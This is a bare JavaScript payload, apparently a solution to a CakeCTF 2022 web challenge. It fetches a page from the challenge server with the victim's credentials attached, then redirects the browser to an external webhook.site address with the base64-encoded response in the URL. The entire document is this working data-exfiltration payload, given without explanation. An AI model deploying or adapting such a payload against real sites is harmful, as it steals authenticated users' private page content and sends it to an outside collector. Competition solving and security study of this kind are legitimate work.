var oReq = new XMLHttpRequest();
oReq.onreadystatechange = function(){
if(oReq.readyState === XMLHttpRequest.DONE) {
    console.log(oReq.responseText);
    document.location='https://webhook.site/9fa288a1-051f-42cb-b13f-0e66604e6cf3?data='+btoa(oReq.responseText);
}
};
oReq.open('GET', 'http://web1.2022.cakectf.com:8003');
oReq.withCredentials = true;
oReq.send();
